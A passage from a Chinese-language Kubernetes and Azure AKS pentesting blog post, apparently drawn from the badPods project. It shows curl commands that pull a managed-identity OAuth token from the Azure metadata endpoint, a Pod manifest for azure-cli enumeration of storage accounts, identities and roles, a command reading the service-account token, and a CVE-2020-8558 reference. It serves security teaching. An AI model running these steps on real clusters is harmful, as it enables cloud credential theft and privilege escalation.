curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2020-10-01" | jq .
2. 如果将托管标识分配给节点，则可以访问节点的标识令牌
 curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"| jq .
 3. 使用azure-cli启动新容器，并执行一些探测命令
apiVersion: v1
kind: Pod
metadata:
  name: nothing-allowed-azurecli-pod
  labels:
    app: pentest
spec:
  containers:
  - name: nothing-allowed-azurecli-pod
    image: mcr.microsoft.com/azure-cli
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
az login -i
az storage account list
az aks list
az identity list
az role assignment list

```

**思路② 默认服务账号**

如果命名空间的默认服务账号挂载到 Pod 中并没设置好权限，则可以利用默认服务账号的 token 来调用 Kubernetes API Server

`cat /var/run/secrets/kubernetes.io/serviceaccount/token`

**思路③** **其他可能可利用**

匿名身份验证：如果 apiserver 或 kubelet 将匿名身份验证设置为 true，并且没有网络策略控制阻止它，则可以直接与它们交互而无需身份验证。

Kubernetes 漏洞利用：可以在没有任何额外权限的情况下访问 Kubernetes 集群。kube-proxy 边界绕过 (CVE-2020-8558)，利用该漏洞可以访问当前 K8S 节点或其他节点(node) 上所监听的 Localhost 端口。https://github.com/tabbysable/POC-2020-8558

项目地址
----

https://github.com/BishopFox/badPods

声明：文章中涉及的程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。

求关注、收藏、星标、点赞、在看哈哈哈。(技术非原创，文章是原创)

由于本人水平有限，也是云安全小白，文章中难免会出现错误，恳请各位师傅们批评指正。